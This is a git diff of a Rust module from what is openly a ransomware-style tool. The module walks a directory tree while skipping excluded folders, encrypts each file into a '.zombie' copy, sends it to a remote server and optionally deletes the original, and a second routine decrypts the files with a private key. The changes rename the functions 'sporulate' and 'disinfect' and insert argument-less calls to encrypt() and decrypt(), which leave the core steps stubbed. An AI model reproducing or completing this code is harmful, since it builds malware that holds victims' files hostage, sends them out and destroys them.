@@ -4,11 +4,11 @@
 use log::{debug, info};
 use std::collections::HashSet;
 // use std::fs;
-use std::io;
+use std::io::{Error, ErrorKind};
 use std::path::PathBuf;
 use walkdir::WalkDir;
 
-use crate::crypto;
+use crate::crypto::{EXTENSION, decrypt, encrypt};
 
 // Rust lifetimes make me wanna cry--pun intended
 // Slices are used to avoid informing the number of elements of an array
@@ -19,7 +19,7 @@ const EXCLUDED_FILES: &'static [&'static str] = &[".dmg", ".tmp", ".DS_Store"];
 
 /// Walks a directory tree starting from `path`, excluding directories
 /// and files based on predefined lists, and encrypts and exfiltrates
-/// files.
+/// files. It's like a spores burst--sporulate.
 ///
 /// # Arguments
 /// - `path`: Starting directory as a `PathBuf`
@@ -33,17 +33,14 @@ const EXCLUDED_FILES: &'static [&'static str] = &[".dmg", ".tmp", ".DS_Store"];
 ///   - Encrypts the file generating a `.zombie` version
 ///   - Sends the encrypted file to the target server
 ///   - Optinally, deletes the original file locally
-pub fn encrypt(
+pub fn sporulate(
     path: PathBuf,
     no_delete: bool,
     server: String,
     target_folder: Option<String>,
-) -> Result<(), io::Error> {
+) -> Result<(), Error> {
     if !path.exists() {
-        return Err(io::Error::new(
-            io::ErrorKind::NotFound,
-            "Path does not exist",
-        ));
+        return Err(Error::new(ErrorKind::NotFound, "Path does not exist"));
     }
     let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
     let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
@@ -103,6 +100,7 @@ pub fn encrypt(
 
             // Encrypt enters here
             debug!("Encrypting file: {:?}", file_path);
+            encrypt()?;
             // Success:
             //debug!("File encrypted: {:?}, size = {} bytes", file_path, file_size);
             // Error:
@@ -130,7 +128,7 @@ pub fn encrypt(
 }
 
 /// Traverses a directory tree starting from `path`, looking for `.zombie`
-/// files to decrypt them.
+/// files to decrypt them. Disinfects a sporulated file.
 ///
 /// # Arguments
 /// - `path`: Starting directory as a `PathBuf`
@@ -142,19 +140,13 @@ pub fn encrypt(
 ///   - Extracts the `.zombie` file header
 ///   - Uses the private key provided to decrypt the header
 ///   - Decrypts the content using the decrypted secret key and IV
-pub fn decrypt(path: PathBuf, key: PathBuf) -> Result<(), io::Error> {
+pub fn disinfect(path: PathBuf, key: PathBuf) -> Result<(), Error> {
     if !path.exists() {
-        return Err(io::Error::new(
-            io::ErrorKind::NotFound,
-            "Path does not exist",
-        ));
+        return Err(Error::new(ErrorKind::NotFound, "Path does not exist"));
     }
 
     if !key.is_file() {
-        return Err(io::Error::new(
-            io::ErrorKind::NotFound,
-            "Key is not a valid file",
-        ));
+        return Err(Error::new(ErrorKind::NotFound, "Key is not a valid file"));
     }
 
     // Creates and sets the directory traversal lazy iterator.
@@ -164,7 +156,7 @@ pub fn decrypt(path: PathBuf, key: PathBuf) -> Result<(), io::Error> {
         .filter_map(Result::ok)
         .filter(|entry| {
             entry.file_type().is_file()
-                && entry.path().extension().and_then(|ext| ext.to_str()) == Some(crypto::EXTENSION)
+                && entry.path().extension().and_then(|ext| ext.to_str()) == Some(EXTENSION)
         });
 
     info!(
@@ -174,7 +166,7 @@ pub fn decrypt(path: PathBuf, key: PathBuf) -> Result<(), io::Error> {
     for entry in walker {
         let file_path = entry.path();
         debug!("Decrypting file: {:?}", file_path);
-        // crypto::decrypt();
+        decrypt()?;
         // Success:
         // debug!("File decrypted: {:?}, size={} bytes", decrypted_file, file_size);
         // Error:
